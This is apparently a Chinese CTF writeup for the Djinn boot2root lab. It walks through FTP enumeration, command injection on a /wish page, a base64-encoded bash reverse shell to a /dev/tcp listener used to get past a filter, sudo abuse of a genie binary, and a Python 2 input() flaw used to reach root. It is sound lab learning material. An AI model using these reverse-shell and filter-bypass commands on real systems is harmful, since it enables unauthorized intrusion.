---
title: Djinn
description: 确实不会写python啊
date: 2025/4/11/ 16:00:00
cover: /images/Djinn_cover.jpg
categories:
  - Writeup
tags:
  - 渗透测试
  - CTF
  - pyc反编译
  - RCE绕过
comment: true # 默认开启，也可以显式设置
---

## 靶机发现端口信息枚举

nmap扫描结果如下：

![img](https://img2020.cnblogs.com/blog/700440/202009/700440-20200915100534351-1425751110.png)

### 端口探测&服务探测

开放了3个端口，21，1337，7331，根据扫描结果知道目标ftp可以使用匿名登录，我们先看看

使用ftp命令登录上去，通过get批量下载目标文件到本地，查看到如下结果：

![img](https://img2020.cnblogs.com/blog/700440/202009/700440-20200915100908677-1479386389.png)

下下来的文件没什么有用的，有个creds.txt里面是mitu:81229也不知道有什么用

```
creds.txt
	nitu:81299
	
game.txt
	oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
	final level and get the prize.
	
message.txt
	@nitish81299 I am going on holidays for few days, please take care of all the work. 
	And don't mess up anything.

```

### 1337端口

打开会让你进行一个游戏的玩，太菜了不会写脚本看零佬是用了pwn库看着好方便啊。

用kimi写了一个能用的脚本

## web服务探测

接着，我们对运行http服务的7331端口进行目录扫描，看看能否发现隐藏的目录。

[![10.png](https://i.loli.net/2019/12/04/jMSldTLoB5F36z7.png)](https://i.loli.net/2019/12/04/jMSldTLoB5F36z7.png)

果不其然，通过目录扫描发现了“/wish”和“/genie”两个目录，依次访问一下。发现“/genie”目录报了403，没有访问权限；而“/wish“目录是一个类似命令执行的页面。

[![11.png](https://i.loli.net/2019/12/04/FYzBbQ8mpuMvak7.png)](https://i.loli.net/2019/12/04/FYzBbQ8mpuMvak7.png)

[![9.png](https://i.loli.net/2019/12/04/dC1lYucDGmoZAVp.png)](https://i.loli.net/2019/12/04/dC1lYucDGmoZAVp.png)

在输入框中输入“id"，页面跳转到了“/genie”，并成功执行了命令。

[![12.png](https://i.loli.net/2019/12/04/X9ZNtBrSLejbkUW.png)](https://i.loli.net/2019/12/04/X9ZNtBrSLejbkUW.png)

## 漏洞利用

直接写上反弹命令提示命令被过滤需要绕过

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/192.168.55.128/4444 <&1'" | base64 
```

得到编码过后的结果，然后用

```bash
echo "加密字符串" |base64 -d |bash
```

这行命令url编码后发送并在本地开启监听端口

成功弹到shell：www-data

![img](https://i.loli.net/2019/12/04/S9XwhDBUvNEdz2j.png)

## 立足点获取

当前权限几乎没任何提权的能力，发现passwd下面有两个用户

![img](https://i.loli.net/2019/12/04/vNHVTbaWkZeofln.png)

nitish之前收集到过一些信息尝试着枚举了一下密码之类的东西，发现没有正确的。

一头雾水的时候搜了一下creds.txt这个文件，发现了在他的家目录下面有个隐藏文件夹中存在明文的密码

![QlxA74.png](https://s2.ax1x.com/2019/12/04/QlxA74.png)

```
su nitish
```

转到用户权限

## 机器信息收集

sudo信息

```
sudo -l 
```

查询发现可以无密码

————下面开始就是另外师傅的东西了，我当时没有思路了—————

[![QlxU3t.png](https://s2.ax1x.com/2019/12/04/QlxU3t.png)](https://s2.ax1x.com/2019/12/04/QlxU3t.png)

使用下面的语句查看一下genie的用法，注意：使用genie -h 可能无法查看全部的用法,发现-p和-cmd两个参数可以执行shell命令



```
man genie
```

[![QlxWvV.png](https://s2.ax1x.com/2019/12/04/QlxWvV.png)](https://s2.ax1x.com/2019/12/04/QlxWvV.png)

之后我执行了下面的语句，但是并没有拿到sam的shell



```
sudo -u sam /usr/bin/genie -p "/bin/sh"
```

但是我使用-cmd参数，执行下面的命令后，成功获得了sam的shell



```
sudo -u sam /usr/bin/genie -cmd whoami
```

[![QlzrM6.png](https://s2.ax1x.com/2019/12/04/QlzrM6.png)](https://s2.ax1x.com/2019/12/04/QlzrM6.png)

再次执行



```
sudo -l
```

查看sudo可以执行的命令，得到了下面的结果

[![Qlz2IH.png](https://s2.ax1x.com/2019/12/04/Qlz2IH.png)](https://s2.ax1x.com/2019/12/04/Qlz2IH.png)

但是执行这条语句之后没有得到有价值的信息，反而让我更加懵逼。。。接着使用下面的命令查找了一下可写的文件，发现了一个/home/sam/.pyc文件，就是进行加密后的python文件。

```
find / -writable -type f 2>/dev/null
```

[![Q1S3Yd.png](https://s2.ax1x.com/2019/12/04/Q1S3Yd.png)](https://s2.ax1x.com/2019/12/04/Q1S3Yd.png)

然后将.pyc文件导出到kali中，进行在线反编译，网址：https://tool.lu/pyc/。反编译之后得到了如下代码：

```
#!/usr/bin/env python
# encoding: utf-8
from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'

if __name__ == '__main__':
    main(options())
from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'

if __name__ == '__main__':
    main(options())
```

仔细审计之后发现这里的input函数，可以确定是python2的版本。搜一下python input() vulnerability，看看input函数的漏洞。果然还是被👴发现了，参考文章：https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/

根据这个漏洞，可以把变量名当成变量的内容来解析，我们可以直接在Guess the number中输入“num“利用此漏洞即可。至此，我们获得了root权限。

[![Q1pOvq.png](https://s2.ax1x.com/2019/12/04/Q1pOvq.png)](https://s2.ax1x.com/2019/12/04/Q1pOvq.png)

## 总结复盘

打靶过程中没顺便写wp图片啥的都是偷别的师傅的，这靶机提权思路有点东西。python2的input漏洞也确实没有任何知识储备可言。

活该我打不出来！！！

学到了什么？一点思考是之前有命令执行但是被过滤的情况我第一个想到了这个项目

![image-20250411084541704](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411084541704.png)https://probiusofficial.github.io/bashFuck/

之前打CTF时候遇到过极限命令执行，但是从来没有实践过，想着这次终于能用了，结果绕过了之后执行没任何效果。不知道问题出在哪了。要是后来有师傅能看到这里了的话请务必GitHub上提个issue告诉我一下